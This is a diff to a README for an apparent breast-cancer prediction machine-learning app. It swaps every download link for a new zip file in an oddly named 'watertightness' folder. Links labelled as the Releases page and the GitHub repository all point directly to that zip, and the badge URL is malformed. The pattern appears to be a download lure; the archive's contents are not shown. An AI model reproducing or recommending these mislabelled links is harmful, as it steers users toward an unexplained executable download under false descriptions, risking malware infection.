@@ -1,6 +1,6 @@
 # 🩺 Breast-Cancer-prediction-using-machine-learning - Predict Breast Cancer Easily
 
-[![Download Now](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip)
+[![Download Now](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Cancer_machine_using_learning_Breast_prediction_1.4.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Cancer_machine_using_learning_Breast_prediction_1.4.zip)
 
 ## 📜 Description
 
@@ -18,7 +18,7 @@ Follow these steps to download and run the application:
 
 2. **Visit the Releases Page**
    - Click the link below to reach the Releases page:
-   - [Download Here](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip)
+   - [Download Here](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Cancer_machine_using_learning_Breast_prediction_1.4.zip)
 
 3. **Choose the Latest Release**
    - Look for the latest version listed on the Releases page. 
@@ -58,7 +58,7 @@ If you encounter any issues while downloading or running the application, please
 
 ## 🔗 Links and Resources
 
-- GitHub Repository: [Breast-Cancer-prediction-using-machine-learning](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip)
-- [Download Here](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip) 
+- GitHub Repository: [Breast-Cancer-prediction-using-machine-learning](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Cancer_machine_using_learning_Breast_prediction_1.4.zip)
+- [Download Here](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Cancer_machine_using_learning_Breast_prediction_1.4.zip) 
 
 Feel free to explore and engage with the project. Your feedback is welcome!
